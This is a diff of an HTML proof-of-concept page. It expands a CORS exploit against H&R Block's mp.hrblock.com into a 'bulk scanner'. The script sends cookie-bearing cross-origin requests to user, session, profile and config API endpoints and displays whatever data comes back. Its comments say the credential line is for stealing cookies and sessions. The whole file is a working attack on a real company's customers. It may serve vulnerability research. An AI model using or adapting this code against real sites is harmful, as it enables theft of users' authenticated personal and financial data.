@@ -1,51 +1,58 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>CORS Takeover PoC - H&R Block</title>
+    <title>Bulk CORS Scanner - H&R Block</title>
     <style>
-        body { font-family: sans-serif; text-align: center; padding: 50px; background-color: #f4f4f4; }
-        .box { border: 2px solid #333; padding: 20px; background: #fff; border-radius: 10px; display: inline-block; }
-        #data { color: red; font-weight: bold; margin-top: 20px; word-wrap: break-word; max-width: 500px; }
+        body { font-family: sans-serif; padding: 20px; background-color: #1a1a1a; color: #00ff00; }
+        .box { border: 1px solid #00ff00; padding: 15px; margin-bottom: 10px; background: #000; border-radius: 5px; }
+        .success { color: #00ff00; font-weight: bold; }
+        .failed { color: #ff0000; }
+        button { padding: 10px 20px; background: #00ff00; color: #000; border: none; font-weight: bold; cursor: pointer; }
     </style>
 </head>
 <body>
 
-    <div class="box">
-        <h2>Security Testing: CORS Data Leak PoC</h2>
-        <p>Target: <code>mp.hrblock.com</code></p>
-        <button onclick="fetchData()">Fetch Sensitive Data</button>
-        
-        <div id="status">Status: Waiting...</div>
-        <div id="data"></div>
-    </div>
+    <h2>H&R Block - Bulk API Scanner (PoC)</h2>
+    <p>Testing for Sensitive Data Leakage across multiple endpoints...</p>
+    <button onclick="startScan()">Start Bulk Scan</button>
+    
+    <div id="results"></div>
 
     <script>
-        function fetchData() {
-            var target_url = "https://mp.hrblock.com/idl/hrb/idl";
-            var xhr = new XMLHttpRequest();
-            var statusDiv = document.getElementById("status");
-            var dataDiv = document.getElementById("data");
+        // In endpoints ko hum scan karenge
+        const endpoints = [
+            "https://mp.hrblock.com/idl/hrb/idl",
+            "https://mp.hrblock.com/idl/hrb/config",
+            "https://mp.hrblock.com/idl/hrb/user",
+            "https://mp.hrblock.com/idl/hrb/session",
+            "https://mp.hrblock.com/idl/hrb/profile"
+        ];
 
-            statusDiv.innerHTML = "Status: Sending Request...";
+        function startScan() {
+            const resultsDiv = document.getElementById("results");
+            resultsDiv.innerHTML = ""; // Clear old results
 
-            xhr.open("GET", target_url, true);
-            
-            // Sabse important line: Cookies aur Sessions churaane ke liye
-            xhr.withCredentials = true; 
+            endpoints.forEach(url => {
+                var xhr = new XMLHttpRequest();
+                xhr.open("GET", url, true);
+                xhr.withCredentials = true; // Cookies use karne ke liye
 
-            xhr.onreadystatechange = function() {
-                if (xhr.readyState == 4) {
-                    if (xhr.status == 200) {
-                        statusDiv.innerHTML = "Status: <span style='color:green;'>Success (Data Leaked!)</span>";
-                        dataDiv.innerHTML = "Leaked JSON: " + xhr.responseText;
-                        console.log("BOOM! Data:", xhr.responseText);
-                    } else {
-                        statusDiv.innerHTML = "Status: <span style='color:red;'>Failed (Status: " + xhr.status + ")</span>";
-                        dataDiv.innerHTML = "Check if your domain matches the vulnerable pattern.";
+                xhr.onreadystatechange = function() {
+                    if (xhr.readyState == 4) {
+                        const div = document.createElement("div");
+                        div.className = "box";
+                        
+                        if (xhr.status == 200) {
+                            div.innerHTML = `<span class="success">[FOUND] URL: ${url}</span><br>Data: ${xhr.responseText}`;
+                            console.log("Success on: " + url);
+                        } else {
+                            div.innerHTML = `<span class="failed">[FAILED] URL: ${url}</span> (Status: ${xhr.status})`;
+                        }
+                        resultsDiv.appendChild(div);
                     }
-                }
-            };
-            xhr.send();
+                };
+                xhr.send();
+            });
         }
     </script>
 </body>
